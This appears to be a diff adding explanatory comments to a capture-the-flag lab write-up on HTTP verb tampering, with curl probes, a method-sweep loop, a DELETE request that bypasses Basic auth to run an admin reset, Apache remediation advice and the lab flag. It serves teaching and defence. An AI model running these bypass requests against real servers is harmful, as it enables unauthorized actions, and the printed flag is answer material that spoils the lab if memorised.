@@ -19,6 +19,7 @@
 ```bash
 curl -i -X OPTIONS "http://TARGET/admin/page.php"
 ```
+> Sends an OPTIONS request and shows the full response headers with `-i`. The `Allow:` header lists which HTTP methods the server accepts. Use this as a starting point before sweeping all verbs.
 
 Look for the `Allow:` header:
 ```
@@ -37,6 +38,7 @@ for V in GET HEAD POST PUT DELETE OPTIONS PATCH TRACE; do
   echo "$V: $code"
 done
 ```
+> Tries every common HTTP method and prints just the status code for each. A 200 from an unauthenticated request when GET returns 401 or 403 means that verb bypasses the auth check.
 
 Interpretation:
 - `401`/`403`/`302` → auth enforced for this verb
@@ -63,6 +65,7 @@ Any `200` from an unauthenticated probe = exploitable.
     Require valid-user
 </LimitExcept>
 ```
+> The vulnerable `<Limit>` block only protects the listed verbs — everything else is unauthenticated. `<LimitExcept>` flips this: it protects all other verbs and leaves the listed ones open. Always use `<LimitExcept>` for auth rules.
 
 > Same pattern in J2EE `<security-constraint>` with `<http-method>` — explicit listing = denylist = vulnerable.
 
@@ -80,6 +83,7 @@ curl -sk -i "http://154.57.164.66:30765/admin/reset.php" | head -3
 # HTTP/1.1 401 Unauthorized
 # WWW-Authenticate: Basic realm="Admin Panel"
 ```
+> Confirms the endpoint is protected by HTTP Basic Authentication. The `WWW-Authenticate` header tells you the auth type and realm. Replace the IP and port with the current lab target.
 
 ### Step 2 — Verb sweep
 ```bash
@@ -88,6 +92,7 @@ for V in GET HEAD POST PUT DELETE OPTIONS PATCH TRACE; do
   echo "$V: $code"
 done
 ```
+> Sweeps all common methods against the protected endpoint. The results reveal which verbs the auth config covers and which slip through.
 
 Result:
 ```
@@ -108,12 +113,14 @@ TRACE:   405      ← method not allowed
 curl -sk -X DELETE "http://154.57.164.66:30765/admin/reset.php" -o /dev/null
 # Reset runs without auth — files cleared
 ```
+> Sends a DELETE request to the protected endpoint. Because the Apache auth rule only covers GET/HEAD/POST, DELETE goes through without credentials. `-o /dev/null` discards the response body since we only care that the reset action runs.
 
 ### Step 4 — Verify reset + grab flag
 ```bash
 curl -sk "http://154.57.164.66:30765/" | grep -oE 'HTB\{[^}]+\}'
 # → HTB{4lw4y5_c0v3r_4ll_v3rb5}
 ```
+> Fetches the home page after the reset and extracts the flag with a regex. Replace the IP and port with the current lab target.
 
 **Flag:** `HTB{4lw4y5_c0v3r_4ll_v3rb5}`
 
